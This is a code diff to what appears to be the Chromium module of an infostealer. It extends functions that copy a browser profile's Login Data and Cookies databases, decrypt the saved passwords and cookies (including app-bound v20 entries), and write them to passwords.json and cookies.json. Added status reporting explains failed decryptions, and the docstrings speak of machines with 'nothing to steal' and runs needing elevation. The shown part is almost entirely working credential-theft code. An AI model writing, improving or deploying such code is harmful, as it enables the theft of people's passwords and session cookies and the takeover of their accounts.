@@ -496,21 +496,46 @@ def bundle_profile(profile: Path, target: Path) -> int:
 # --- artifacts ----------------------------------------------------------------
 
 
-def _passwords(profile: Path, scratch: Path, target: Path, keys: Keys) -> int:
+def _passwords(
+    profile: Path, scratch: Path, target: Path, keys: Keys
+) -> tuple[int, dict[str, Any]]:
+    """``(entries written, what happened)``.
+
+    The status is the point. A browser with five saved logins and no key to open them
+    produces the same count as a browser with no logins at all, and that difference is
+    the difference between a machine with nothing to steal and a run that needs
+    elevation. The reason is recorded beside the count so it travels in the payload.
+    """
+    status: dict[str, Any] = {"rows": 0, "attempted": 0, "opened": 0, "written": 0, "reason": ""}
+
     source = profile / "Login Data"
     if not source.is_file():
-        return 0
+        status["reason"] = "no Login Data"
+        return 0, status
     copy = copy_database(source, scratch)
     if copy is None:
-        return 0
+        status["reason"] = "copy refused"
+        return 0, status
 
     rows = read_table(copy, "logins", _WANTED_PASSWORDS, _MAX_PASSWORDS, "date_last_used DESC")
+    status["rows"] = len(rows)
     entries: list[dict[str, Any]] = []
+    app_bound_rows = 0
 
     for row in rows:
-        secret = secret_value(row["password_value"], keys, b"")
+        blob = row["password_value"]
+        if isinstance(blob, (bytes, bytearray)) and bytes(blob[:3]) == _PREFIX_V20:
+            app_bound_rows += 1
+        if not blob:
+            # A row with no ciphertext is a saved username, not a password. Counting it
+            # as an attempted decrypt would report a key failure on a machine that has
+            # nothing to decrypt.
+            continue
+        status["attempted"] += 1
+        secret = secret_value(blob, keys, b"")
         if secret is None:
             continue
+        status["opened"] += 1
         username = text_value(row["username_value"])
         password = secret.decode("utf-8", "replace")
         if not username and not password:
@@ -528,21 +553,49 @@ def _passwords(profile: Path, scratch: Path, target: Path, keys: Keys) -> int:
         )
 
     if not entries:
-        return 0
+        if rows and not status["attempted"]:
+            status["reason"] = "rows present, no stored password"
+        elif status["attempted"] and not status["opened"]:
+            if not keys.user and not keys.app_bound:
+                status["reason"] = "no key: Local State gave neither key"
+            elif app_bound_rows and keys.app_bound is None:
+                status["reason"] = (
+                    f"{app_bound_rows} v20 rows need the app-bound key, "
+                    "which was not unwrapped"
+                )
+            else:
+                status["reason"] = "every tag check failed"
+            log.logger.warning(
+                "chromium: %s has %d logins and opened none: %s",
+                profile.name,
+                len(rows),
+                status["reason"],
+            )
+        return 0, status
     if not util.write_json(target / "passwords.json", entries):
-        return 0
-    return len(entries)
+        status["reason"] = "write refused"
+        return 0, status
+
+    status["written"] = len(entries)
+    return len(entries), status
 
 
-def _cookies(profile: Path, scratch: Path, target: Path, keys: Keys) -> int:
+def _cookies(
+    profile: Path, scratch: Path, target: Path, keys: Keys
+) -> tuple[int, dict[str, Any]]:
+    status: dict[str, Any] = {"rows": 0, "opened": 0, "written": 0, "reason": ""}
+
     source = _first_existing(profile, ("Network/Cookies", "Cookies"))
     if source is None:
-        return 0
+        status["reason"] = "no Cookies"
+        return 0, status
     copy = copy_database(source, scratch)
     if copy is None:
-        return 0
+        status["reason"] = "copy refused"
+        return 0, status
 
     rows = read_table(copy, "cookies", _WANTED_COOKIES, _MAX_COOKIES, "last_access_utc DESC")
+    status["rows"] = len(rows)
     entries: list[dict[str, Any]] = []
 
     for row in rows:
@@ -555,6 +608,7 @@ def _cookies(profile: Path, scratch: Path, target: Path, keys: Keys) -> int:
             if not value:
                 continue
         else:
+            status["opened"] += 1
             value = secret.decode("utf-8", "replace")
 
         entries.append(
@@ -571,10 +625,18 @@ def _cookies(profile: Path, scratch: Path, target: Path, keys: Keys) -> int:
         )
 
     if not entries:
-        return 0
+        if rows:
+            status["reason"] = "rows present, none readable"
+            log.logger.warning(
+                "chromium: %s has %d cookies and wrote none", profile.name, len(rows)
+            )
+        return 0, status
     if not util.write_json(target / "cookies.json", entries):
-        return 0
-    return len(entries)
+        status["reason"] = "write refused"
+        return 0, status
+
+    status["written"] = len(entries)
+    return len(entries), status
 
 
 def _write_history(rows: list[dict[str, Any]], target: Path) -> int:
@@ -713,24 +775,46 @@ def _bookmarks(profile: Path, target: Path) -> int:
 
 
 def run_profile(profile: Path, target: Path) -> int:
-    """Collect every artifact for one profile. Returns the number of items written."""
+    """Collect every artifact for one profile. Returns the number of items written.
+
+    ``_status.json`` lands beside the artifacts. It carries the key material that was
+    available and, per artifact, how many rows were seen, how many opened and why the
+    ones that did not were dropped — so a run that collected nothing says which kind
+    of nothing it was.
+    """
     if not profile.is_dir():
         return 0
 
     keys = profile_keys(profile)
     written = 0
+    status: dict[str, Any] = {
+        "profile": profile.name,
+        "keys": {"user": bool(keys.user), "app_bound": bool(keys.app_bound)},
+        "artifacts": {},
+    }
 
     with util.temp_workspace("sable-chromium-") as scratch:
-        written += _passwords(profile, scratch, target, keys)
-        written += _cookies(profile, scratch, target, keys)
-        written += _history(profile, scratch, target)
-        written += _bookmarks(profile, target)
+        count, detail = _passwords(profile, scratch, target, keys)
+        status["artifacts"]["passwords"] = detail
+        written += count
+        count, detail = _cookies(profile, scratch, target, keys)
+        status["artifacts"]["cookies"] = detail
+        written += count
+        count = _history(profile, scratch, target)
+        status["artifacts"]["history"] = {"written": count, "reason": ""}
+        written += count
+        count = _bookmarks(profile, target)
+        status["artifacts"]["bookmarks"] = {"written": count, "reason": ""}
+        written += count
 
     # One item, however many files it carries: the count is what the collector
     # returned, and five thousand bundled files is still one collected artifact.
-    if bundle_profile(profile, target):
+    bundled = bundle_profile(profile, target)
+    status["bundled_files"] = bundled
+    if bundled:
         written += 1
 
+    util.write_json(target / "_status.json", status)
     log.logger.debug("chromium: %s wrote %d", profile.name, written)
     return written
 
